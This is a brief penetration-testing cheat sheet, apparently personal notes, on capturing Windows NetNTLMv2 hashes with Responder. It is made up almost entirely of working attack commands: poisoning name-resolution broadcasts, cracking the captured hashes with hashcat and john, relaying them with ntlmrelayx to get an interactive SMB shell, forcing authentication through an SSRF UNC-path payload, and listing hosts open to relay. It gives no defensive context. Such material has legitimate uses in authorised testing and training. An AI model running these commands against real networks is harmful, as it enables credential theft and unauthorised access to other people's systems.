# Responder NetNTLMv2 Capture

Responder poisons LLMNR/NBT-NS/mDNS broadcast queries and captures NetNTLMv2 hashes from Windows hosts.

**Run Responder:**
```bash
responder -I tun0 -v
responder -I eth0 -wrf   # with wpad and fingerprint
```

**Captured hashes saved to:**
```
/usr/share/responder/logs/
~/.responder/logs/          # newer versions
```

**Crack NTLMv2 hash:**
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

**Relay instead of crack** (when signing disabled):
```bash
# First disable SMB/HTTP in /etc/responder/Responder.conf:
# SMB = Off, HTTP = Off
responder -I tun0 -v &
ntlmrelayx.py -tf targets.txt -smb2support
# or for shell:
ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive SMB shell
```

**Trigger from web app** (SSRF → UNC path): `\\<LHOST>\share` in any parameter processed by Windows.

**Check if signing disabled (relay viable):**
```bash
crackmapexec smb <subnet>/24 --gen-relay-list targets.txt
```
